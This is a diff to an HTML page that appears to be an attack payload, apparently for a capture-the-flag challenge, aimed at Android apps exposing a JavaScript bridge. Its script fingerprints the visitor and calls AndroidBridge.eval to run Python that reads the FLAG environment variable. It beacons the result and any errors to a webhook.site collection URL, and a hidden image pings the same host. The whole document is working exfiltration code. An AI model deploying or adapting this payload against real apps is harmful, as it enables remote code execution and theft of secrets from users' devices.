@@ -1,11 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
 <script>
 navigator.sendBeacon('https://webhook.site/2734bd6c-a958-43a6-be94-8b2e74a26072/hit?ua=' + encodeURIComponent(navigator.userAgent) + '&bridge=' + (!!window.AndroidBridge));
 if (window.AndroidBridge) {
   try {
-    const flag = window.AndroidBridge.eval("import os\nprint(os.environ.get('FLAG'))");
+    var flag = window.AndroidBridge.eval("import os\nprint(os.environ.get('FLAG'))");
     navigator.sendBeacon('https://webhook.site/2734bd6c-a958-43a6-be94-8b2e74a26072/flag?v=' + encodeURIComponent(flag));
   } catch (e) {
     navigator.sendBeacon('https://webhook.site/2734bd6c-a958-43a6-be94-8b2e74a26072/err?v=' + encodeURIComponent(String(e)));
   }
 }
 </script>
+</head>
+<body>
+<img src="https://webhook.site/2734bd6c-a958-43a6-be94-8b2e74a26072/img.png" style="display:none">
+</body>
+</html>
